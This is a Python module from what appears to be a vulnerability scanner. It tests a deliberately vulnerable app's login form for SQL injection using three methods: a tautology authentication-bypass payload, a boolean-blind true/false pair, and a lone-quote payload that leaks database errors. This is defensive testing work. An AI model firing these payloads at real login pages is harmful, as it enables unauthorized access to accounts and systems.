"""AVSA SQL Injection detection module (AVSA_SPEC §5.1).

Targets DVAI's single injectable sink: the login query (db.py:86), which is
built by f-string interpolation of the username/password. Every other DVAI query
uses bound `?` placeholders and is not injectable, so this module probes LOGIN
only.

Injection is proven from the OUTSIDE, three independent ways, with no reliance on
data being echoed back:

  1. auth_bypass     — a tautology comments out the password check and logs in.
  2. boolean_blind   — a TRUE vs FALSE payload pair produces the login oracle
                       (TRUE gets in, FALSE does not): classic blind-SQLi proof.
  3. error_based     — a malformed payload breaks SQL syntax and DVAI's debug
                       page leaks the raw sqlite3 error + offending SQL.

Honest scope (enforced): no UNION-to-screen data dump, no attempt to read the
password column to screen, no identity pivot. The login query's result is never
rendered, so an in-band UNION row read is not possible here; the identity pivot
belongs to the Chain 2 slice, not this one.

This module bolts onto the Probe layer for its config (base_url/timeout) but uses
FRESH, unauthenticated requests for every primitive — it must never log in as the
configured user first, or the auth-bypass would not be an independent proof.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Optional

import requests


# --- finding ----------------------------------------------------------------

@dataclass
class Finding:
    """One module's verdict. Module-local for now; this gets centralised when the
    reporter is built (Sprint 6)."""

    id: str = "sqli"
    name: str = "SQL Injection"
    layer: str = "web"
    present: bool = False
    severity: str = "Critical"
    owasp: str = "A03:2021 - Injection"
    primitives: list[str] = field(default_factory=list)   # which proofs landed
    attempts: Optional[int] = None                        # web layer is deterministic
    evidence: dict[str, str] = field(default_factory=dict)  # primitive -> evidence
    notes: str = ""


# --- payloads ---------------------------------------------------------------

# Trailing space after `--` is REQUIRED: SQLite needs whitespace after the
# comment introducer for it to start a comment.
TAUTOLOGY_TRUE = "' OR '1'='1' -- "
TAUTOLOGY_FALSE = "' AND '1'='2' -- "
MALFORMED = "'"   # a lone quote: unbalanced string literal -> syntax error


# --- deterministic helpers (pure; unit-tested without a server) -------------

def is_login_success(status_code: int, location: str) -> bool:
    """DVAI signals a successful login with a 302 whose Location points at /chat.
    A 200 (re-rendered login page) or a redirect anywhere else is NOT success."""
    return status_code == 302 and "/chat" in (location or "")


# Signatures that betray a leaked SQLite error in a response body. DVAI runs with
# debug=True and does not wrap the login db.execute, so a broken query surfaces a
# Werkzeug debug page carrying the raw exception and SQL.
_SQL_ERROR_SIGNATURES = (
    "operationalerror",
    "sqlite3",
    "unrecognized token",
    "syntax error",
)


def has_sql_error_signature(body: str) -> bool:
    """True if the response body looks like a leaked SQL error page."""
    if not body:
        return False
    haystack = body.lower()
    return any(sig in haystack for sig in _SQL_ERROR_SIGNATURES)


def _error_excerpt(body: str, limit: int = 200) -> str:
    """Pull a SHORT excerpt around the first SQL-error signature, so evidence
    captures the leaked line without dumping the whole debug page."""
    lowered = body.lower()
    idx = -1
    for sig in _SQL_ERROR_SIGNATURES:
        found = lowered.find(sig)
        if found != -1 and (idx == -1 or found < idx):
            idx = found
    if idx == -1:
        return ""
    start = max(0, idx - 20)
    return body[start:start + limit].strip()


# --- runner -----------------------------------------------------------------

def run(probe) -> Finding:
    """Probe DVAI's login sink with the three primitives and return a Finding.

    Uses a throwaway, unauthenticated session built from the probe's config — it
    deliberately does NOT reuse probe.session, so the configured user is never
    logged in and each primitive stands as an independent external proof.
    """
    base_url = probe.config.base_url.rstrip("/")
    timeout = probe.config.timeout
    login_url = base_url + "/login"

    finding = Finding()

    # Fresh session: a real external attacker holds no valid credentials.
    session = requests.Session()

    def attempt_login(username: str, password: str, allow_redirects: bool = False):
        return session.post(
            login_url,
            data={"username": username, "password": password},
            allow_redirects=allow_redirects,
            timeout=timeout,
        )

    # -- Primitive 1: AUTH BYPASS (the headline) ----------------------------
    resp = attempt_login(TAUTOLOGY_TRUE, "x")
    bypass_location = resp.headers.get("Location", "")
    bypass_ok = is_login_success(resp.status_code, bypass_location)
    if bypass_ok:
        finding.primitives.append("auth_bypass")
        finding.evidence["auth_bypass"] = (
            f"username={TAUTOLOGY_TRUE!r} password='x' -> "
            f"HTTP {resp.status_code}, Location: {bypass_location}"
        )

    # -- Primitive 2: BOOLEAN-BLIND DIFFERENTIAL ----------------------------
    # Reuse the TRUE result from primitive 1's payload (same payload), then a
    # fresh FALSE request. The oracle is: TRUE logs in, FALSE does not.
    true_status, true_loc = resp.status_code, bypass_location
    false_resp = attempt_login(TAUTOLOGY_FALSE, "x")
    false_loc = false_resp.headers.get("Location", "")
    true_in = is_login_success(true_status, true_loc)
    false_in = is_login_success(false_resp.status_code, false_loc)
    if true_in and not false_in:
        finding.primitives.append("boolean_blind")
        finding.evidence["boolean_blind"] = (
            f"TRUE  username={TAUTOLOGY_TRUE!r} -> HTTP {true_status}, "
            f"Location: {true_loc or '(none)'} | "
            f"FALSE username={TAUTOLOGY_FALSE!r} -> HTTP {false_resp.status_code}, "
            f"Location: {false_loc or '(none)'}"
        )

    # -- Primitive 3: ERROR-BASED DISCLOSURE --------------------------------
    # Follow redirects so that, if a malformed payload somehow still authed, we
    # still read a rendered body; the error page itself is a 200 from the debugger.
    err_resp = attempt_login(MALFORMED, "x", allow_redirects=True)
    if has_sql_error_signature(err_resp.text):
        finding.primitives.append("error_based")
        finding.evidence["error_based"] = (
            f"username={MALFORMED!r} password='x' -> leaked: "
            f"{_error_excerpt(err_resp.text)!r}"
        )

    finding.present = bool(finding.primitives)
    finding.notes = (
        "Injection proven via login sink (db.py:86). No in-band UNION row dump is "
        "possible — the login query result is never rendered; plaintext-password "
        "severity is evidenced separately (manual DB inspection / report narrative)."
    )
    return finding
